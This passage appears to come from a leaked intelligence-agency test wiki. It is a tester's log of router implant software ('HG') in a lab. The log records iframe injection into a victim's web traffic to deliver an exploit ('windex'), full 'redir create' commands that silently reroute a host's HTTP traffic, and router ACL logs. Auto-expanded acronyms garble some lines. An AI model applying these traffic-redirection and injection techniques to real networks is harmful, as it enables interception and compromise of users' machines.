0021.d80d.cfc1) -> 10.11.0.13(3985), 1 packetNov 27 20:59:50.043 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(4031), 1 packetNov 27 20:59:51.639 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(4028), 1 packetNov 27 21:00:12.727 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied udp 10.9.8.22(137) (Vlan2 0021.d80d.cfc1) -> XXX.XXX.X.XX (TOPWAY-NET[CN])(137), 3 packetsNov 27 21:00:14.859 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(4072), 1 packetcytolysis-1#
+
+With multiple attempts - successfully exploited about 1/3 of the time, also rx these prints every time.  packet assist threshold made it to a max of 96.  Had to use bf flag on smite rule to work.
+Uninstall HG, reload device, attempt again to see if prints still occur without HG.
+Device clean, victim 3 restarted.  attempting to web browse to X.X.X.XX (LVLT-GOGL-8-8-8[US]) from victim 3 - looking for prints first observed in step b.  
+At first try, page didn't load - seemed hung.  However no prints observed.  Refreshed and page loaded successfully.
+Restarting victim 3, cleared nat trans.  
+Was able to get to web page successfully on all attempts, from all hosts.  I then browsed directly to windex using iframe url and was successfully exploited.  No prints at any time to console.
+Reating test.  Restart router and victim 3
+Browsed around from all hosts - no prints.  Pages loaded successfully.  Broswed directly to windex and successfully was exploited.  no prints.  Repeated the exploitation three times.  no prints, all four total attempts successful
+Reinstall HG and repeat tests
+After HG installed, I web browsed from all hosts - no prints for return traffic from X.X.X.XX (LVLT-GOGL-8-8-8[US]) to victim 3 as noticed on first browsing attempt earlier.  Was able to successfully repeat web browsing directly to windex to exploit with no prints.  However, when injecting iframe with SMITE rule, result was same as previous - acl logging prints.  exploitation not consistently successful.cytolysis-1#Nov 27 22:36:57.507 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2372), 1 packetcytolysis-1#Nov 27 22:38:04.791 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2510), 1 packetNov 27 22:38:06.451 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2503), 1 packetNov 27 22:38:07.503 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2505), 1 packetNov 27 22:38:11.463 C6506: %SEC-6-IPACCESSLOGRL: access-list logging rate-limited or missed 3 packets
+
+
+
+Smoke test - completed smoke tests of packet collection and redirect.  Smoke test of DIVRTDigital Imaging & Video Recovery Team does work, but seeing prints similar to what I saw during SMITE:Dec 1 00:32:19.683 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp 100.100.40.3(80) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(1074), 1 packet
+
+
+Verified no redir, collect or mitm rules on HG.  Disconnected CTCounter Terrorism session.  No ip nat translations, only cust1host1 traffic. Will get a look at how adding HG affects it when idle.  Collect stats in AM.
+stats collected - idle-withhg
+
+Test of redirection
+Test that rules can be created/deleted/enabled/disabled with all parameters expected during op - time, max sessions
+HG installed but no rules present
+Verified successfuly browsing with no prints to google, 100.100.40.3 and 100.100.40.4 three times from victim 1-4, seeds, and cust1host1
+Created rule to redirect traffic from 10.11.0.14 to X.X.X.XX (LVLT-GOGL-8-8-8[US]) -> 100.100.40.3 with a time of 5 minutes and a max sessions of 3[XXX.XXX.X.XX (TOPWAY-NET[CN])]> redir create 10.11.0.14 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 tcp 0 0 100.100.40.3 80 0 -t 300s -sm 3 -en[Pending] Job: 136264184************ Pending ************[redir create 10.11.0.14 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 tcp 0 0 100.100.40.3 80 0 -t 300s -sm 3 -en]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> [Success]  ID 10  Enabled Yes  Persist No  Source IP 10.11.0.14  Source Mask 255.255.255.255  Start SRCSource Port 0  End SRCSource Port 0  Dest IP X.X.X.XX (LVLT-GOGL-8-8-8[US])  Dest Mask 255.255.255.255  Start DSTDirectorate of Science & Technology Port 80  End DSTDirectorate of Science & Technology Port 80  Protocol TCPTransport Control Protocol  New source IP 0.0.0.0  New Src Port 0  New Dest IP 100.100.40.3  New Dest Port 80  New TTLTime To Live 0  Time Delay 0d 0h 0m 0s  Session Delay 0  Session % 100  Time Duration 0d 0h 5m 0s  Restart Time Delay 0d 0h 0m 0s Max Sessions Termination 3  Automatic Restart No Press <enter> to continue State ENABLED  Time Remaining 0d 0h 4m 57s 952ms  Sessions Remaining 3  Accounting No  Logging No  Encrypt Packets No  Decrypt Packets No  Swap Dst IP No  Swap Src Port No  Swap Dst Port No  Mode Active  Dst Mac Address  Packets Redirected 0  Most Recent Redirection  Matched Sessions 0  Modified Sessions 0  Active Sessions 0 Job: 136264184************ Success ************
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+
+Added two more rules for .13. and .12 source hosts.  Redir show ouput normal, redir status as well:
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> redir status[Success]  Enabled Rules 3/3  Persisted Rules 0/3  Matched Packets 0 Modified Packets 0 ************ Success ************[redir status]
+
+Disabled and then re-enabled all 3 rules.  Disabled rule 12.  verified state of rules with redir show and redir status.
+Deleted all three rules. verfiied rules were deleted with redir show and redir status.
+Added rule for .14 back and enabled it, restarted FilterBroker.  Rule did not survive restart, however FB restarted successfully
+Added rule for .14 back enabled, and rule for .13 disabled.  Restarted FB.  Rules did not survive restart, however FB restarted successfully
+Added rule for .14 back:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> redir create 10.11.0.14 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 tcp 0 0 100.100.40.3 80 0 -t 300s -sm 3 -en
+Tested ability to successfully redirect .14 three times and then verified rule was disabled after that.
+Browsed to google and was redirected, output from redir show and redir status[XXX.XXX.X.XX (TOPWAY-NET[CN])]> redir show[Pending] Job: 136972560************ Pending ************[redir show]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> [Success]  ID 16  Enabled Yes  Persist No  Source IP 10.11.0.14  Source Mask 255.255.255.255  Start SRCSource Port 0  End SRCSource Port 0  Dest IP X.X.X.XX (LVLT-GOGL-8-8-8[US])  Dest Mask 255.255.255.255  Start DSTDirectorate of Science & Technology Port 80  End DSTDirectorate of Science & Technology Port 80  Protocol TCPTransport Control Protocol  New source IP 0.0.0.0  New Src Port 0  New Dest IP 100.100.40.3  New Dest Port 80  New TTLTime To Live 0  Time Delay 0d 0h 0m 0s  Session Delay 0  Session % 100  Time Duration 0d 0h 5m 0s  Restart Time Delay 0d 0h 0m 0s Max Sessions Termination 3  Automatic Restart No Press <enter> to continue State ENABLED  Time Remaining 0d 0h 2m 29s 480ms  Sessions Remaining 2  Accounting No  Logging No  Encrypt Packets No  Decrypt Packets No  Swap Dst IP No  Swap Src Port No  Swap Dst Port No  Mode Active  Dst Mac Address  Packets Redirected 17  Most Recent Redirection  Matched Sessions 1  Modified Sessions 1  Active Sessions 1 Job: 136972560************ Success ************
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> redir status[Success]  Enabled Rules 1/1  Persisted Rules 0/1  Matched Packets 17 Modified Packets 17 ************ Success ************[redir status]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Broswed away from the redirected page and saw that the number of active sessions is now 0
+repeated test once - same result.
+time expired on rule - noticed that the rule still showed active for some time after the time had expired, it took a bit for the rule to update and show disabled in output of redir show.  But it did update, time remaining showed 0, sessions remaining 1, enabled no.  browsing to google was not redirected from target host.
+Repeated the test, this time getting all three sessions redirected before rule had expired.
+Verified that I was able to redirect three times, and then after that subsequent connections went to google.  Rule changed to disabled.  packet assist pps only at 3.
+re-added the rule - verifed that i can still browse from .14 to other web destinations without a problem
+re-added the rule and verified that i can browse normally to google and other web destinations from cust1host1, seeds, victim1,2,3.
+re-added the rule and verfied that 443 traffic was not redirected while 80 was by testing from victim 4 to https://www.google.com
+
+Looking for punch throughs - enabled rule with no time limit or max sessions.  watched tcpdump on X.X.X.XX (LVLT-GOGL-8-8-8[US]) - no punch throughs when I opened 6 new windows and browsed from all windows at the same time, mutliple times,clearing the local files between.
+
+
+
+
+Test packet collectionRule manipulation - parameters expected during op - time and 
+
+Test fix of Cytoloysis using 12-17 delivery
+Reloaded DUT
+Installed new HG
+Restarted Victim 3
+Browsed from Victim 3 to all three web servers successfully, no prints
+Added SMITE rule for victim3 - google web traffic, to inject real iframe for windex
+Ran 8 injections - after the 8th I got the following prints:*Dec 17 16:04:29.531: %SEC-6-IPACCESSLOGP: list 101 denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(0) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(0), 1 packet*Dec 17 16:04:29.939: %SEC-6-IPACCESSLOGP: list 101 denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(0) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(0), 1 packet*Dec 17 16:04:30.755: %SEC-6-IPACCESSLOGP: list 101 denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(0) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(0), 1 packetRouter>
+
+
+These are slightly different from the prints that were previously observed since they are for return traffic from the web server targeted by the smite rule, not for the return traffic from windows.  This may be expected behavior since the pps threshold has tripped:
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> packet get_assist_threshold_status [Success]  Maximum Packets Per Second: 1500  Number of Packets Counted Per Sample: 3000  Highest Observed Packets Per Second: 4687 Number of Overflows Since Settings Last Changed: 3  Time of Last Overflow: 2015-12-17T18:38:54Z ************ Success ************[packet get_assist_threshold_status]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Reset counters on pps threshold
+Tested more iframes - xxx after three times the pps hit 453 highest observed. x after fourth time the highest observed went to 1948 - tripped the threshold.  No prints observed yet.
+Tested more iframes - x - still at 1948 for User #?
+
+Reset the pps and tested more iframes x - User #? at 20.  x - User #? at 377.  x - User #? at 377. X - User #? 812.  X - User #? 812.  
+Tried to trip the pps threshold and I got up to 5474 packets with 2 iframe injections and sessions to other web servers at once from same target host.  No print
+Called updated Xetron, continuing to run iterations x, x - User #? 0.  x 8, x 5474, x, x57
+Running more iterations after reseting pps again - at this point completed 26 iterations.x,x
+Setting packet assist to 50k 
+xxxxx xx
+Sent email to Xetron with results from yesterday.  Retrying today.  Packet assist still set to 50k
+xxxxx xxxxx
+
+
+Test fix for Cytolysis using Shrinking Violet delivery
+Reloaded DUT
+Installed new HG
+Restarted Victim 3
+Browsed from Victim 3 to all three web servers successfully, no prints
+Added SMITE rule for victim3 - google web traffic, to inject real iframe for windex
+xxxxx xxxxx xxxxx xxxxx xxxxx xxx
+
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 [Xetron]
+| 9 [Xetron]
+| 10 [Xetron]
+| 11 [Xetron]
+| 12 [Xetron]
+| 13 [Xetron]
+| 14 [Xetron]
+| 15 [Xetron]
+| 16 [Xetron]
+| 17 [Xetron]
+| 18 [Xetron]
+| 19 [Xetron]
+| 20 [Xetron]
+| 21 [Xetron]
+| 22 [Xetron]
+| 23 [Xetron]
+| 24 [Xetron]
+| 25 [Xetron]
+| 26 [Xetron]
+| 27 [Xetron]
+| 28 [Xetron]
+| 29 [Xetron]
+| 30 [Xetron]
+| 31 [Xetron]
+| 32 [Xetron]
+| 33 [Xetron]
+| 34 [Xetron]
+| 35 [Xetron]
+| 36 [Xetron]
+|
+                    
